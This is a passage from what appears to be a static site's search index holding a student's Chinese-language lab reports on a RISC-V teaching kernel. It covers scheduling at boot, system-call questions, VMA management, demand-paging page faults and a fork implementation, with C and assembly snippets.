sepc);\n}\n</code></pre>"},{"location":"cs/system/cs3/lab4/#_7","title":"\u4fee\u6539\u542f\u52a8\u90e8\u5206","text":"<p>\u56e0\u4e3a\u60f3\u8981\u5728\u5185\u6838\u542f\u52a8\u540e\u5c31\u7acb\u5373\u8fdb\u884c\u8c03\u5ea6\uff0c\u8f6c\u5230\u7528\u6237\u8fdb\u7a0b\u8fd0\u884c\uff0c\u6240\u4ee5\u8981\u5728 start_kernel \u4e2d\u624b\u52a8\u8c03\u7528 schedule() \u51fd\u6570\u3002\u540c\u65f6\u4e3a\u4e86\u907f\u514d\u6b64\u65f6\u53d1\u751f\u65f6\u949f\u4e2d\u65ad\uff0c\u8981\u5148\u5c06 status[SIE] \u8bbe\u7f6e\u4e3a 0\u3002</p> <pre><code>extern void test();\nextern void schedule();\n\nint start_kernel(int x) {\n    printk(\"%d\", x);\n    printk(\" ZJU Computer System III\\n\");\n\n    schedule();\n\n    test(); // DO NOT DELETE !!!\n\n    return 0;\n}\n</code></pre> <pre><code>    ...\n    call sbi_set_timer\n    # csrr a0, sstatus\n    # ori a0, a0, 1 &lt;&lt; 1\n    # csrw sstatus, a0\n\n    li a0, 2023\n    j start_kernel\n</code></pre>"},{"location":"cs/system/cs3/lab4/#_8","title":"\u5b9e\u9a8c\u6d4b\u8bd5\u7ed3\u679c","text":"<p>\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a</p> <p>\u53ef\u89c1\u5f00\u5934\u51fa\u6b63\u786e\u4e3a\u4e09\u4e2a\u7528\u6237\u8fdb\u7a0b\u6620\u5c04\u5efa\u7acb\u4e86\u9875\u8868\uff0c\u7136\u540e\u5185\u6838\u6001\u8f93\u51fa 2023 ZJU Computer System III \u540e\u8fdb\u884c\u8c03\u5ea6\u5207\u6362\u5230\u4e86\u7528\u6237\u8fdb\u7a0b\uff0c\u4e09\u4e2a\u8fdb\u7a0b\u4f9d\u6b21\u8f93\u51fa\u4e86\u6b63\u786e\u7684 pid\uff08\u7b2c\u4e8c\u6b21\u8c03\u5ea6\u5230 pid 1 \u7684\u65f6\u5019\u7531\u4e8e\u8fdb\u7a0b\u5185\u662f\u5728 busy wait\uff0c1s \u7684\u65f6\u95f4\u8fd8\u6ca1\u5230\u5b83\u4e0b\u4e00\u6b21\u8f93\u51fa\u7684\u65f6\u5019\uff0c\u6240\u4ee5\u8fd8\u6ca1\u6709\u8f93\u51fa\uff09\u3002</p>"},{"location":"cs/system/cs3/lab4/#_9","title":"\u601d\u8003\u9898","text":""},{"location":"cs/system/cs3/lab4/#_10","title":"\u62f7\u8d1d\u5185\u6838\u9875\u8868\u4e3a\u4ec0\u4e48\u53ef\u4ee5\u76f4\u63a5\u5728\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e0a\u8d4b\u503c","text":"<p>\u56e0\u4e3a\u4e4b\u524d\u5efa\u7acb\u7684\u5185\u6838\u9875\u8868\u5305\u542b\u4e86\u5185\u6838\u7684\u6240\u6709\u865a\u62df\u5730\u5740\uff0c\u62f7\u8d1d\u5230\u7528\u6237\u9875\u8868\u4e2d\u4e4b\u540e\u7528\u6237\u6001\u5c31\u4e5f\u53ef\u4ee5\u8bbf\u95ee\u90a3\u4e9b\u5206\u914d\u8fc7\u7684\u865a\u62df\u5730\u5740\u4e86\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u5728\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e0a\u8d4b\u503c\u3002</p>"},{"location":"cs/system/cs3/lab4/#_11","title":"\u7cfb\u7edf\u8c03\u7528\u8fd4\u56de\u4e3a\u4ec0\u4e48\u4e0d\u80fd\u76f4\u63a5\u4fee\u6539\u5bc4\u5b58\u5668","text":"<p>\u56e0\u4e3a\u7cfb\u7edf\u8c03\u7528\u662f\u5728 trap \u4e2d\u7684\uff0ctrap_handler \u6267\u884c\u524d\u540e\u4f1a\u8fdb\u884c\u5bc4\u5b58\u5668\u7684\u4fdd\u5b58\u548c\u6062\u590d\uff0c\u6765\u4f7f\u5f97\u88ab\u4e2d\u65ad\u7684\u7a0b\u5e8f\u53ef\u4ee5\u201c\u65e0\u610f\u8bc6\u201d\u5730\u56de\u5230\u539f\u6765\u7684\u72b6\u6001\u3002\u4f46\u7cfb\u7edf\u8c03\u7528\u671f\u671b\u5728\u8fd4\u56de\u65f6\u5bc4\u5b58\u5668\u6709\u6240\u6539\u53d8\uff0c\u6240\u4ee5\u8981\u901a\u8fc7 regs \u7ed3\u6784\u4f53\u6765\u4fee\u6539\u6808\u4e0a\u4fdd\u5b58\u7684\u5185\u5bb9\uff0c\u4f7f\u5f97\u6062\u590d\u7684\u65f6\u5019\u5bc4\u5b58\u5668\u503c\u66f4\u65b0\uff0c\u5426\u5219\u76f4\u63a5\u4fee\u6539\u5bc4\u5b58\u5668\u540e\u7eed\u5c31\u53c8\u88ab\u8986\u76d6\u4e86\u3002</p>"},{"location":"cs/system/cs3/lab4/#sepc-4","title":"\u9488\u5bf9\u7cfb\u7edf\u8c03\u7528\uff0c\u4e3a\u4ec0\u4e48\u8981\u624b\u52a8\u5c06 sepc + 4","text":"<p>\u56e0\u4e3a\u9488\u5bf9\u5176\u4ed6\u4e2d\u65ad/\u5f02\u5e38\uff0c\u6bd4\u5982\u65f6\u949f\u4e2d\u65ad\uff0c\u5f53\u524d\u6307\u4ee4\u88ab\u6253\u65ad\u4e86\u6ca1\u6709\u6267\u884c\u5b8c\u6bd5\uff0c\u540e\u7eed\u518d\u56de\u6765\u7684\u65f6\u5019\u8fd8\u8981\u6267\u884c\u8fd9\u6761\u88ab\u6253\u65ad\u7684\u6307\u4ee4\uff0c\u6240\u4ee5 sepc = pc\u3002\u800c\u7cfb\u7edf\u8c03\u7528\u7684\u4e2d\u65ad\u662f\u7531 ecall \u5f15\u8d77\u7684\uff0c\u518d\u56de\u5230\u540c\u4e00\u4f4d\u7f6e\u5219\u4ecd\u4f1a\u89e6\u53d1 ecall \u5982\u6b64\u6b7b\u5faa\u73af\u3002\u6240\u4ee5 ecall \u8fd9\u6837\u5b9e\u9645\u4e0a\u662f\u60f3\u8981\u5728\u5904\u7406\u540e\u8df3\u5230\u4e0b\u4e00\u6761\u6307\u4ee4\uff0c\u6240\u4ee5\u8981\u624b\u52a8\u5c06 sepc + 4\u3002</p>"},{"location":"cs/system/cs3/lab4/#heads-sstatussie-0","title":"head.S \u4e2d\u4e3a\u4ec0\u4e48\u8981\u5c06 sstatus[SIE] \u7f6e 0","text":"<p>\u56e0\u4e3a\u4fee\u6539\u4e86\u4e4b\u540e\u5728 start_kernel \u4e2d\u76f4\u63a5\u8c03\u7528\u4e86 schedule \u51fd\u6570\uff0c\u8fd9\u6b21\u8c03\u7528\u4e0d\u540c\u4e8e\u4e4b\u524d\u7684 schedule\uff0c\u5b83\u4e0d\u5728\u4e2d\u65ad\u5904\u7406\u8fc7\u7a0b\u4e2d\uff08\u4e4b\u524d\u90fd\u662f\u65f6\u949f\u4e2d\u65ad\u5f15\u8d77\uff09\uff0c\u6240\u4ee5\u6b64\u65f6\u4ecd\u4f1a\u63a5\u6536\u4e2d\u65ad\uff08\u4e4b\u524d\u7531\u4e2d\u65ad\u5f15\u8d77\u7684\u8bdd\uff0c\u5728\u4e2d\u65ad\u5904\u7406\u8fc7\u7a0b\u4e2d\u5c31\u5df2\u7ecf\u62d2\u7edd\u63a5\u6536\u5176\u4ed6\u4e2d\u65ad\u4e86\uff09\u3002\u4e3a\u4e86\u4fdd\u8bc1 schedule \u4e0d\u88ab\u5176\u4ed6\u4e2d\u65ad\u6253\u65ad\uff0c\u6240\u4ee5\u8981\u5728\u8fd9\u4e4b\u524d\u5173\u95ed\u6240\u6709 S \u6a21\u5f0f\u4e0b\u7684\u4e2d\u65ad\uff0c\u4e5f\u5c31\u662f\u5c06 sstatus[SIE] \u7f6e 0\u3002\u8fd9\u4e00\u6548\u679c\u7684\u6062\u590d\u53d1\u751f\u5728\u8fd4\u56de\u5230\u7528\u6237\u6001\u65f6\uff0c\u7531\u4e8e task_init \u4e2d sstatus[SPIE] \u8bbe\u4e3a\u4e86 1\uff0c\u6240\u4ee5\u8fd4\u56de\u540e SIE \u4e5f\u5c31\u53d8\u56de\u4e86 1\u3002</p>"},{"location":"cs/system/cs3/lab5/","title":"RV64 \u7f3a\u9875\u5f02\u5e38\u5904\u7406\u4ee5\u53ca fork \u673a\u5236","text":"<p> \u7ea6 2147 \u4e2a\u5b57  155 \u884c\u4ee3\u7801  3 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2162 lab5 \u5b9e\u9a8c\u62a5\u544a\uff082023.05.18 ~ 2023.06.01\uff09</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs3/lab5/#_1","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>\u901a\u8fc7 vm_area_struct \u6570\u636e\u7ed3\u6784\u5b9e\u73b0\u5bf9\u8fdb\u7a0b\u591a\u533a\u57df\u865a\u62df\u5185\u5b58\u7684\u7ba1\u7406</li> <li>\u5728 lab4 \u5b9e\u73b0\u7528\u6237\u6001\u7a0b\u5e8f\u7684\u57fa\u7840\u4e0a\uff0c\u6dfb\u52a0\u7f3a\u9875\u5f02\u5e38\u5904\u7406 page fault handler</li> <li>\u4e3a\u8fdb\u7a0b\u52a0\u5165 fork \u673a\u5236\uff0c\u80fd\u591f\u652f\u6301\u901a\u8fc7 fork \u521b\u5efa\u65b0\u7684\u7528\u6237\u6001\u8fdb\u7a0b</li> <li>\u601d\u8003\u9898<ol> <li>\u6839\u636e\u5b9e\u73b0\u5206\u6790\u7236\u8fdb\u7a0b\u5728\u7528\u6237\u6001\u6267\u884c fork \u81f3\u5b50\u8fdb\u7a0b\u88ab\u8c03\u5ea6\u5e76\u5728\u7528\u6237\u6001\u6267\u884c\u7684\u8fc7\u7a0b\uff0c\u6700\u597d\u80fd\u591f\u5c06\u5bc4\u5b58\u5668\u72b6\u6001\u7684\u53d8\u5316\u8fc7\u7a0b\u6e05\u6670\u8bf4\u660e\u3002</li> </ol> </li> </ul>"},{"location":"cs/system/cs3/lab5/#_2","title":"\u5b9e\u9a8c\u8fc7\u7a0b","text":""},{"location":"cs/system/cs3/lab5/#_3","title":"\u5b9e\u73b0\u865a\u62df\u5185\u5b58\u7ba1\u7406","text":"<p>\u6309\u7167\u5b9e\u9a8c\u6307\u5bfc\u4fee\u6539 proc.h \u6dfb\u52a0 vm_area_struct \u7b49\u7ed3\u6784\u3002\u63a5\u4e0b\u6765\u8981\u5b9e\u73b0\u7684\u5c31\u662f\u5bf9\u4e8e vma \u94fe\u8868\u7684\u4e09\u4e2a\u64cd\u4f5c\u51fd\u6570\u3002</p> <ul> <li>find_vma<ul> <li>\u904d\u5386 vma \u94fe\u8868\uff0c\u627e\u5230\u5305\u542b addr \u7684 vma <pre><code>struct vm_area_struct *find_vma(struct mm_struct *mm, uint64 addr) {\n    struct vm_area_struct *vma = mm-&gt;mmap;\n    while (vma != NULL) {\n        if (addr &gt;= vma-&gt;vm_start &amp;&amp; addr &lt; vma-&gt;vm_end) {\n            return vma;\n        }\n        vma = vma-&gt;vm_next;\n    }\n    return NULL;\n}\n</code></pre></li> </ul> </li> <li>do_mmap<ul> <li>\u4e3a\u8fdb\u7a0b\u6dfb\u52a0\u65b0\u7684 vma</li> <li>\u7ed9\u51fa\u7684 addr \u53ea\u662f\u671f\u671b\u7684\u5730\u5740\uff0c\u5982\u679c\u6709\u91cd\u53e0\u5219\u8c03\u7528 get_unmapped_area \u5bfb\u627e\u5b9e\u9645\u6620\u5c04\u7684\u865a\u62df\u5730\u5740</li> <li>\u7b2c\u4e00\u90e8\u5206\uff1a\u5bfb\u627e\u5b9e\u9645\u6620\u5c04\u7684\u865a\u62df\u5730\u5740\u8303\u56f4     <pre><code>uint64 start_va = PGROUNDDOWN(addr);\nuint64 end_va = PGROUNDUP(addr + length);\nuint64 page_num = (end_va - start_va) / PGSIZE;\nfor (uint64 i = 0; i &lt; page_num; ++i) {\n    if (find_vma(mm, start_va + i * PGSIZE) != NULL) {\n        start_va = get_unmapped_area(mm, length);\n        end_va = PGROUNDUP(start_va + length);\n        break;\n    }\n}\n</code></pre></li> <li>\u7b2c\u4e8c\u90e8\u5206\uff1a\u521b\u5efa vma \u94fe\u8868\u9879\uff0c\u586b\u5145\u4fe1\u606f\u5e76\u63d2\u5165\u94fe\u8868     <pre><code>struct vm_area_struct *vma = (struct vm_area_struct *)kalloc();\nvma-&gt;vm_start = start_va;\nvma-&gt;vm_end = end_va;\nvma-&gt;vm_next = mm-&gt;mmap;\nvma-&gt;vm_mm = mm;\nvma-&gt;vm_flags = prot;\nif (mm-&gt;mmap != NULL)\n    mm-&gt;mmap-&gt;vm_prev = vma;\nmm-&gt;mmap = vma;\nreturn start_va;\n</code></pre></li> </ul> </li> <li>get_unmapped_area<ul> <li>\u4ece USER_START \u5f00\u59cb\uff0c\u4ee5 PGSIZE \u4e3a\u5355\u4f4d\u5bfb\u627e\u8fde\u7eed length \u957f\u5ea6\u672a\u5206\u914d\u7684\u865a\u62df\u5730\u5740 <pre><code>uint64 get_unmapped_area(struct mm_struct *mm, uint64 length) {\n    uint64 addr = USER_START;\n    uint64 page_num = length / PGSIZE + (length % PGSIZE != 0);\n    for (addr = USER_START; addr &lt; USER_END; addr += PGSIZE) {\n        uint64 i;\n        for (i = 0; i &lt; page_num; ++i) {\n            if (find_vma(mm, addr + i * PGSIZE) != NULL) {\n                addr = addr + i * PGSIZE;\n                break;\n            }\n        }\n        if (i == page_num) {\n            return addr;\n        }\n    }\n}\n</code></pre></li> </ul> </li> </ul>"},{"location":"cs/system/cs3/lab5/#page-fault","title":"\u5904\u7406 Page Fault","text":"<p>\u8fd9\u4e00\u90e8\u5206\u8981\u8fdb\u884c\u4e24\u4ef6\u4e8b\u60c5\uff0c\u4e00\u4e2a\u662f\u4fee\u6539 task_init\uff0c\u4f7f\u7528 demand paging\uff0c\u4e0d\u76f4\u63a5\u521b\u5efa\u6620\u5c04\uff0c\u800c\u662f\u4f7f\u7528\u524d\u9762\u5199\u8fc7\u7684 do_mmap \u8bb0\u5f55 vma\uff1b\u4e00\u4e2a\u662f\u5904\u7406\u540e\u7eed\u4f1a\u53d1\u751f\u7684\u7f3a\u9875\u5f02\u5e38\uff0c\u68c0\u67e5\u540e\u521b\u5efa\u6620\u5c04\u3002</p>"},{"location":"cs/system/cs3/lab5/#task_init","title":"task_init","text":"<p>\u8981\u8fdb\u884c\u7684\u4fee\u6539\u662f\u9996\u5148\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u521b\u5efa\u597d vma \u94fe\u8868\uff0c\u4e4b\u540e\u518d\u5c06\u4e24\u6b21 create_mapping \u6539\u4e3a do_mmap \u5373\u53ef\u3002</p> <p>\u8fd9\u91cc\u4e3a\u4e86\u65b9\u4fbf\u5c06 VM_READ VM_WRITE VM_EXEC \u8bbe\u4e3a\u4e86 PTE_R PTE_W PTE_X\u3002</p> <ul> <li>\u521b\u5efa\u94fe\u8868     <pre><code>_task-&gt;mm = (struct mm_struct*)kalloc();\n_task-&gt;mm-&gt;mmap = NULL;\n</code></pre></li> <li>\u521b\u5efa vma \u8bb0\u5f55     <pre><code>do_mmap(_task-&gt;mm, USER_START, uapp_end - uapp_start, VM_READ | VM_WRITE | VM_EXEC);\ndo_mmap(_task-&gt;mm, USER_END - PGSIZE, PGSIZE, VM_READ | VM_WRITE);\n</code></pre></li> </ul>"},{"location":"cs/system/cs3/lab5/#page-fault-handler","title":"page fault handler","text":"<p>\u5728 trap_handler \u4e2d\u8865\u5145\u5bf9\u4e8e scause \u4e3a 12\u300113\u300115 \u65f6\u7684\u5904\u7406\uff0c\u5747\u4f7f\u7528\u540c\u4e00\u4e2a do_page_fault \u51fd\u6570\u6765\u5904\u7406\u3002</p> <p>do_page_fault \u8981\u5148\u8fdb\u884c bad address \u7684\u68c0\u67e5\uff0c\u5982\u679c\u5728\u5206\u914d\u7684\u8303\u56f4\u5185\u518d\u521b\u5efa\u6620\u5c04\u3002\u4e0d\u80fd\u5206\u914d\u7684\u8bdd\uff08\u4e0d\u5728\u8303\u56f4\u5185\u6216\u8005\u6743\u9650\u4e0d\u5bf9\uff09\u7ed3\u675f\u8fdb\u7a0b\uff0c\u8fd9\u91cc\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 TASK_EXITED \u5e76\u8bbe\u7f6e\u7ed9 state \u518d schedule \u5c31\u53ef\u4ee5\u4e86\uff0c\u8fd9\u4e2a\u8fdb\u7a0b\u4e4b\u540e\u5c31\u4e0d\u4f1a\u518d\u8c03\u5ea6\u5230\u4e86\u3002</p> <ul> <li>\u68c0\u67e5 bad address<ul> <li>\u8303\u56f4\u68c0\u67e5     <pre><code>uint64 scause = csr_read(scause);\nuint64 stval = csr_read(stval);\nuint64 sepc = csr_read(sepc);\nstruct vm_area_struct* vma = find_vma(current-&gt;mm, stval);\nif (vma == NULL) {\n    ...\n}\n</code></pre></li> <li>\u6743\u9650\u68c0\u67e5\uff0812 \u68c0\u67e5 EXEC\uff0c13 \u68c0\u67e5 WRITE\uff0c15 \u68c0\u67e5 READ\uff09     <pre><code>if (vma == NULL || (\n    scause == 12 &amp;&amp; !(vma-&gt;vm_flags &amp; VM_EXEC)) ||\n    scause == 13 &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE) ||\n    scause == 15 &amp;&amp; !(vma-&gt;vm_flags &amp; VM_READ\n)) {\n    printk(\"[pid = %d] page fault at [0x%lx] with cause = %d\\n\", current-&gt;pid, stval, scause);\n    current-&gt;state = TASK_EXITED;\n    schedule();\n    return;\n}\n</code></pre></li> </ul> </li> <li>\u521b\u5efa\u6620\u5c04<ul> <li>\u5982\u679c\u662f 12 \u5219\u6620\u5c04 uapp_start \u4e4b\u540e\u7684\u7269\u7406\u5730\u5740\uff0c\u5426\u5219 kalloc \u521b\u5efa\u65b0\u9875\u4f5c\u4e3a\u7269\u7406\u5730\u5740</li> <li>\u56e0\u4e3a\u8fd9\u91cc\u8981\u4fee\u6539\u9875\u8868\uff0c\u800c\u6211\u5728\u4e0a\u4e00\u4e2a lab \u4e2d\u5c06 task_struct \u4e2d\u7684\u9875\u8868\u5730\u5740\u6539\u4e3a\u4e86 satp\uff0c\u4e3a\u4e86\u907f\u514d\u8ba1\u7b97\u9ebb\u70e6\uff0c\u6240\u4ee5\u53c8\u65b0\u52a0\u4e86\u4e00\u4e2a pgtbl \u8868\u793a\u9875\u8868\u5730\u5740\uff0c\u5e76\u5728\u521b\u5efa\u8fdb\u7a0b\u7684\u65f6\u5019\u540c\u65f6\u8bb0\u5f55 pgtbl \u548c satp <pre><code>if (scause == 12) {\n    uint64 va = PGROUNDDOWN(stval);\n    uint64 pa = (uint64)(uapp_start) + (va - USER_START) - PA2VA_OFFSET;\n    uint64 perm = vma-&gt;vm_flags | PTE_U | PTE_V;\n    create_mapping(current-&gt;pgtbl, va, pa, PGSIZE, perm);\n} else {\n    uint64 va = PGROUNDDOWN(stval);\n    uint64 pa = (uint64)kalloc() - PA2VA_OFFSET;\n    uint64 perm = vma-&gt;vm_flags | PTE_U | PTE_V;\n    create_mapping(current-&gt;pgtbl, va, pa, PGSIZE, perm);\n}\n</code></pre></li> </ul> </li> </ul> <p>trap_handler \u91cc\u7684\u4fee\u6539\u5c31\u76f4\u63a5\u6dfb\u52a0\u4e00\u4e2a else if \u5c31\u597d\u4e86</p> <pre><code>    ...\n    } else if (scause == 12 || scause == 13 || scause == 15) {\n        do_page_fault(regs);\n        return;\n    } ...\n</code></pre>"},{"location":"cs/system/cs3/lab5/#fork","title":"\u5b9e\u73b0 fork","text":"<p>\u8fd9\u90e8\u5206\u8981\u5b9e\u73b0\u7684\u5c31\u662f\uff0cproc.c \u4e2d\u521d\u59cb\u5316\u8fdb\u7a0b\u7684\u903b\u8f91\uff0c\u66f4\u65b0 syscall \u51fd\u6570\uff0c\u5b9e\u73b0 do_fork \u529f\u80fd\uff0c\u66f4\u65b0 page fault \u5904\u7406\u3002</p> <p>\u6211\u7684\u5b9e\u73b0\u4e2d\u5c06 NR_TASKS \u8bbe\u7f6e\u4e3a\u5141\u8bb8\u7684\u6700\u5927\u8fdb\u7a0b\u6570\uff0c\u6839\u636e\u6700\u540e\u7684\u6d4b\u8bd5\uff0c\u5e94\u8be5\u662f 1+4\uff0c\u7136\u540e proc.c \u4e2d\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u53d8\u91cf nr_tasks \u8bb0\u5f55\u5f53\u524d\u5b9e\u9645\u5b58\u5728\u7684\u7528\u6237\u8fdb\u7a0b\u6570\uff0c\u7528\u4e8e\u66f4\u65b0 pid\u3002</p>"},{"location":"cs/system/cs3/lab5/#syscall","title":"\u66f4\u65b0 syscall","text":"<p>trap_handler \u4e0d\u9700\u8981\u4fee\u6539\uff0c\u53ea\u9700\u8981\u5728 syscall \u51fd\u6570\u4e2d\u5224\u65ad a7 \u662f\u5426\u4e3a SYS_clone \u5373\u53ef\uff1a</p> <pre><code>    ...\n    } else if (regs-&gt;x[17] == SYS_clone) {\n        regs-&gt;x[10] = do_fork(regs);\n    } ...\n</code></pre>"},{"location":"cs/system/cs3/lab5/#do_fork","title":"\u5b9e\u73b0 do_fork","text":"<p>do_fork \u5373\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u8fdb\u7a0b\uff0c\u6240\u4ee5\u4e3b\u4f53\u7684\u903b\u8f91\u548c task_init \u4e2d\u521d\u59cb\u5316\u7528\u6237\u8fdb\u7a0b\u5dee\u4e0d\u591a\u3002</p> <ul> <li>\u521b\u5efa task \u5e76\u8bbe\u7f6e state counter priority pid     <pre><code>struct task_struct *_task = (struct task_struct *)kalloc();\n_task-&gt;state = TASK_RUNNING;\n_task-&gt;counter = 0;\n_task-&gt;priority = (uint64)rand() % (PRIORITY_MAX - PRIORITY_MIN + 1) + PRIORITY_MIN;\n_task-&gt;pid = ++nr_tasks;\n</code></pre></li> <li>\u8bbe\u7f6e\u7528\u6237\u6808 sp\u3001\u5185\u6838\u6808 sp\uff0c\u5e76\u62f7\u8d1d\u5f53\u524d\u8fdb\u7a0b\u7684\u7528\u6237\u6808\u5185\u5bb9\u5230\u5b50\u8fdb\u7a0b\u7528\u6237\u6808     <pre><code>_task-&gt;user_sp = kalloc();\nmemcpy((void *)_task-&gt;user_sp, (void *)current-&gt;user_sp, PGSIZE);\n_task-&gt;kernel_sp = (uint64)_task + PGSIZE;\n</code></pre></li> <li>\u8bbe\u7f6e thread \u7ed3\u6784\u4f53\u4fe1\u606f<ul> <li>thread.ra \u4e3a forkret \u51fd\u6570\u5730\u5740</li> <li>thread.sp \u4e3a\u5185\u6838\u6808 sp</li> <li>thread.sscratch \u4e3a\u5185\u6838\u6808 sp</li> <li>thread.sepc \u548c\u5f53\u524d sepc \u4e00\u6837\uff0csstatus \u540c\u7406\u8bbe\u7f6e <pre><code>_task-&gt;thread.ra = (uint64)forkret;\n_task-&gt;thread.sp = (uint64)_task + PGSIZE;\n_task-&gt;thread.sscratch = (uint64)_task + PGSIZE;\n_task-&gt;thread.sepc = regs-&gt;sepc;\nuint64 sstatus = current-&gt;thread.sstatus;\nsstatus &amp;= ~(1 &lt;&lt; 8);\nsstatus |= (1 &lt;&lt; 5);\nsstatus |= (1 &lt;&lt; 18);\n_task-&gt;thread.sstatus = sstatus;\n</code></pre></li> </ul> </li> <li>\u521b\u5efa\u65b0\u7684\u9875\u8868\uff0c\u62f7\u8d1d\u5185\u6838\u9875\u8868\uff0c\u5e76\u8bbe\u7f6e satp     <pre><code>uint64 *pgtbl = (uint64 *)kalloc();\nmemcpy(pgtbl, swapper_pg_dir, PGSIZE);\nuint64 satp = csr_read(satp);\nsatp = (satp &gt;&gt; 44) &lt;&lt; 44;\nsatp |= ((uint64)(pgtbl) - PA2VA_OFFSET) &gt;&gt; 12;\n_task-&gt;satp = satp;\n_task-&gt;pgtbl = pgtbl;\n</code></pre></li> <li>\u521b\u5efa vma \u94fe\u8868\u5e76\u62f7\u8d1d\u5f53\u524d\u8fdb\u7a0b\u5df2\u521b\u5efa\u7684\u8bb0\u5f55     <pre><code>_task-&gt;mm = (struct mm_struct *)kalloc();\n_task-&gt;mm-&gt;mmap = NULL;\nstruct vm_area_struct *vma = current-&gt;mm-&gt;mmap;\nwhile (vma != NULL) {\n    do_mmap(_task-&gt;mm, vma-&gt;vm_start, vma-&gt;vm_end - vma-&gt;vm_start, vma-&gt;vm_flags);\n    vma = vma-&gt;vm_next;\n}\n</code></pre></li> <li>\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 trapframe\uff0c\u62f7\u8d1d\u5f53\u524d\u8fdb\u7a0b\u5bc4\u5b58\u5668\u5230\u5176\u4e2d     <pre><code>_task-&gt;trapframe = (struct pt_regs *)kalloc();\nfor (int i = 0; i &lt; 32; ++i) {\n    _task-&gt;trapframe-&gt;x[i] = regs-&gt;x[i];\n}\n_task-&gt;trapframe-&gt;sepc = regs-&gt;sepc;\n</code></pre><ul> <li>\u7279\u522b\u8bbe\u7f6e sp\uff0c\u56e0\u4e3a\u8fdb\u5165 trap_handler \u540e\u5207\u6362\u4e86\u7528\u6237\u6808\u548c\u5185\u6838\u6808\uff0c\u6240\u4ee5\u6b64\u65f6 regs-&gt;x[2] \u5b9e\u9645\u4e3a\u5185\u6838\u6808 sp\uff0c\u800c\u8fd9\u4e4b\u524d\u7684\u7528\u6237\u6808 sp \u4ea4\u6362\u5230\u4e86 sscratch \u4e2d\uff0c\u6240\u4ee5\u8981\u5c06 sscratch \u8d4b\u7ed9 x[2]     <pre><code>uint64 sscratch = csr_read(sscratch);\n_task-&gt;trapframe-&gt;x[2] = sscratch;\n</code></pre></li> <li>\u7279\u522b\u8bbe\u7f6e a0\uff0c\u5b50\u8fdb\u7a0b\u7684 fork \u8fd4\u56de\u503c\uff0c\u4e3a 0     <pre><code>_task-&gt;trapframe-&gt;x[10] = 0;\n</code></pre></li> </ul> </li> <li>\u5c06\u65b0\u5efa\u7684 _task \u6dfb\u52a0\u5230 task \u5217\u8868\u4e2d\uff0c\u5e76\u8fd4\u56de\u5b50\u8fdb\u7a0b pid \u4f5c\u4e3a\u7236\u8fdb\u7a0b fork \u7684\u8fd4\u56de\u503c     <pre><code>task[nr_tasks] = _task;\nreturn _task-&gt;pid;\n</code></pre></li> </ul> <p>\u8fd9\u4e4b\u540e\u9700\u8981\u5b9e\u73b0\u7684\u662f forkret \u51fd\u6570\uff0c\u5373\u5b50\u8fdb\u7a0b\u521d\u59cb\u7684\u8df3\u8f6c\u4f4d\u7f6e\uff0c\u5b50\u8fdb\u7a0b\u5230\u8fd9\u91cc\u4e4b\u540e\u8981\u7ee7\u7eed\u8df3\u8f6c\u5230 ret_from_fork\uff0c\u5e76\u63d0\u4f9b\u8fdb\u7a0b\u7684 trapframe \u4f5c\u4e3a\u53c2\u6570\uff1a</p> <pre><code>extern void ret_from_fork(struct pt_regs *regs);\nvoid forkret() {\n    ret_from_fork(current-&gt;trapframe);\n}\n</code></pre> <p>\u800c ret_from_fork \u5219\u5728 trap.S \u4e2d\u76f4\u63a5 ld \u56de\u6240\u6709\u7684\u5bc4\u5b58\u5668\u4ee5\u53ca sepc\uff0c\u518d sret \u5373\u53ef\uff1a <pre><code>.globl ret_from_fork\nret_from_fork:\n    ld t1, 256(a0)\n    addi t1, t1, 4 # manually sepc+=4\n    csrw sepc, t1\n    ld ra, 8(a0)\n    ...\n    ld s1, 72(a0)\n    # restore a0 last\n    ld a1, 88(a0)\n    ...\n    ld t6, 248(a0)\n    ld a0, 80(a0)\n    sret\n</code></pre></p>"},{"location":"cs/system/cs3/lab5/#page-fault_1","title":"\u66f4\u65b0 page fault","text":"<p>\u56e0\u4e3a do_fork \u7684\u65f6\u5019\u5df2\u7ecf\u62f7\u8d1d\u4e86\u7528\u6237\u6808\uff0c\u4f46\u6ca1\u6709\u66f4\u65b0\u9875\u8868\uff0c\u6240\u4ee5\u5b50\u8fdb\u7a0b\u5f00\u59cb\u8fd0\u884c\u7684\u65f6\u5019\u4ecd\u4f1a\u89e6\u53d1 page fault\uff0c\u8fd9\u65f6\u4f1a\u521b\u5efa\u65b0\u7684\u7528\u6237\u6808\uff0c\u4e3a\u4e86\u907f\u514d\u8fd9\u4e2a\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 user_sp \u6765\u533a\u5206\uff0c\u6211\u4eec\u5728\u521d\u59cb\u5316\u8fdb\u7a0b\u7684\u65f6\u5019\u8bbe\u7f6e user_sp \u4e3a 0\uff0c\u7136\u540e do_page_fault \u4e2d\u6620\u5c04\u6808\u7a7a\u95f4\u65f6\u68c0\u67e5 user_sp \u662f\u5426\u4e3a 0\uff0c\u5982\u679c\u4e3a 0 \u5219\u8c03\u7528 kalloc \u5206\u914d\uff0c\u5426\u5219\uff08\u5373\u8868\u793a\u662f fork \u6765\u7684\uff09\u76f4\u63a5\u4f7f\u7528 user_sp \u4f5c\u4e3a\u7269\u7406\u5730\u5740\u3002</p> <pre><code>     } else {\n        if (current-&gt;user_sp == 0) {\n            current-&gt;user_sp = kalloc();\n        }\n        uint64 va = USER_END - PGSIZE;\n        uint64 pa = current-&gt;user_sp - PA2VA_OFFSET;\n        uint64 perm = vma-&gt;vm_flags | PTE_U | PTE_V;\n        create_mapping(current-&gt;pgtbl, va, pa, PGSIZE, perm);\n    